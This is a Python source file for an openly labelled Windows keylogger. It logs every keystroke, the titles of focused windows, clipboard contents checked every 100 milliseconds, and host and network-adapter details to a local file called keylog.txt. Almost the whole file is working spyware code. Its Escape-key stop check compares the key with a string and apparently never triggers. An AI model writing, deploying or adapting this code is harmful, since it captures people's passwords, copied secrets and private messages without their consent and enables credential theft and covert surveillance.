import logging
from pynput import keyboard
import platform
import os
from datetime import datetime, date
import psutil
import ifaddr
import clipboard
import threading
import time
import subprocess
from ctypes import windll, create_unicode_buffer, wintypes

# Windows API setup
user32 = windll.user32

# Global variables for tracking
current_window = ""
last_clipboard_content = ""
ctrl_pressed = False
log_file = "keylog.txt"

# Setup logging
#logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%H:%M:%S') 
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s') 


#Get the current window informations
def get_current_window_title():
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthW(hwnd)
    buf = create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buf, length + 1)
    
    return buf.value if buf.value else None

#Get system info
def system_info():
    interfaces = ""
    
    #Current day of the year
    day = datetime.today()
    day = day.strftime("%b %d %Y")
    

    # Store system information
    os_uname = platform.platform()
    computer_name = platform.node()
    sys_info = os_uname + "\nComputer name: " + computer_name


    # Store interfaces informations
    ifname = ifaddr.get_adapters()
    for adapter in ifname:
       interfaces += "\nIPs of network adapter " + adapter.nice_name
       for ip in adapter.ips:
           interfaces += "\n  IP %s/%s" % (ip.ip, ip.network_prefix)
    

    return "{0}\n{1}\n\nInterfaces:{2}".format(day, sys_info, interfaces)

# Log window focus change
def log_window_change():
    global current_window
    new_window = get_current_window_title()
    if new_window and new_window != current_window:
        current_window = new_window
        logging.info(f"[WINDOW FOCUS CHANGED] {current_window}")

# Monitor clipboard for changes
def monitor_clipboard():
    global last_clipboard_content
    try:
        current_clipboard = clipboard.paste()
        if current_clipboard != last_clipboard_content:
            last_clipboard_content = current_clipboard
            logging.info(f"[CLIPBOARD] {current_clipboard}")
    except Exception:
        pass  # Ignore clipboard errors

# Thread function to continuously monitor window and clipboard
def monitor_system():
    while True:
        log_window_change()
        monitor_clipboard()
        time.sleep(0.1)  # Check every 100ms

### Enhanced Keylogger ###
def on_press(key):
    global ctrl_pressed
    print(key)
    # Log window change before logging key
    log_window_change()
    
    try:
        # Handle control characters (Ctrl+letter combinations)
        if hasattr(key, 'char') and key.char is not None:
            # Check for control characters
            if key.char == '\x01':  # Ctrl+A
                logging.info("[CTRL+A - SELECT ALL]")
                return
            elif key.char == '\x03':  # Ctrl+C
                logging.info("[CTRL+C - COPY]")
                return
            elif key.char == '\x16':  # Ctrl+V
                logging.info("[CTRL+V - PASTE]")
                return
            elif key.char == '\x18':  # Ctrl+X
                logging.info("[CTRL+X - CUT]")
                return
            elif key.char == '\x1a':  # Ctrl+Z
                logging.info("[CTRL+Z - UNDO]")
                return
            elif key.char == '\x19':  # Ctrl+Y
                logging.info("[CTRL+Y - REDO]")
                return
            elif key.char == '\x13':  # Ctrl+S
                logging.info("[CTRL+S - SAVE]")
                return
            elif key.char == '\x0f':  # Ctrl+O
                logging.info("[CTRL+O - OPEN]")
                return
            elif key.char == '\x0e':  # Ctrl+N
                logging.info("[CTRL+N - NEW]")
                return
            elif key.char == '\x06':  # Ctrl+F
                logging.info("[CTRL+F - FIND]")
                return
            elif ord(key.char) < 32:  # Other control characters
                logging.info(f"[CTRL+{chr(ord(key.char) + 64)}]")
                return
            else:
                # Regular printable character
                logging.info(key.char)
                return
        
        # Handle special keys
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            return  # Don't log ctrl by itself
        elif key == keyboard.Key.enter:
            logging.info("[ENTER]")
        elif key == keyboard.Key.tab:
            logging.info("[TAB]")
        elif key == keyboard.Key.space:
            logging.info(" ")
        elif key == keyboard.Key.backspace:
            logging.info("[BACKSPACE]")
        elif key == keyboard.Key.delete:
            logging.info("[DELETE]")
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            return  # Don't log shift by itself
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            return  # Don't log alt by itself
        else:
            # Other special keys
            logging.info(f"[{str(key).replace('Key.', '').upper()}]")
            
    except AttributeError:
        # Handle any other special keys
        logging.info(f"[{str(key).replace('Key.', '').upper()}]")

def on_release(key):
    # Exit on Escape key
    if key == '\x1c':
        logging.info("[KEYLOGGER STOPPED]")
        return False

# Start system monitoring thread
monitor_thread = threading.Thread(target=monitor_system, daemon=True)
monitor_thread.start()

# Log system information at startup
logging.info(f"[KEYLOGGER STARTED]\n{system_info()}")

# Start keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
